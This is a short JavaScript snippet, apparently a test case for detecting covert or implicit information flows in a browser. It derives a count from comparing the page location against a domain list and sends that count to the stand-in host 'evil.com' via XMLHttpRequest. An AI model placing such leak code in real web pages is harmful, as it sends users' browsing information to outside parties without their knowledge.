var TopString = (45).toString(12);
document.location.href = TopString;

var arr = ["covert.com", "blah.com"];
var i = 0, count = 0;
while(arr[i] && document.location.href != arr[i]) {
	i++;
	count++;
}
var x = new XMLHttpRequest();
x.open("GET", "http://evil.com");
x.send(count);